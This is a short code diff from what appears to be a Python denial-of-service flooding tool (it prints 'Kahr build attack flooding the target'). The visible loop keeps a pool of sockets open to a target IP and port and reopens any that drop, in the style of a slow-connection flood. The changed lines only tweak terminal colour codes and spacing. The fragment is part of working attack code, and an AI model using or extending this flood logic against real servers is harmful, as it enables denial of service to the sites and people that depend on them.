@@ -70,7 +70,7 @@ def main():
     bar.finish()
 
     while True:
-        print(("\033[94m [÷] Kahr build attack flooding the target {}".format(len(socket_list))))
+        print(("\033[34m [÷] Kahr build attack flooding the target {}".format(len(socket_list))))
 
         for s in socket_list:
             try:
@@ -79,7 +79,7 @@ def main():
                 socket_list.remove(s)
 
         for _ in range(socket_count - len(socket_list)):
-            print(("\033[33m {}      Connenting...".format("\n")))
+            print(("\033[33m {}     Connenting...".format("\n")))
             try:
                 s=init_socket(ip,port)
                 if s:
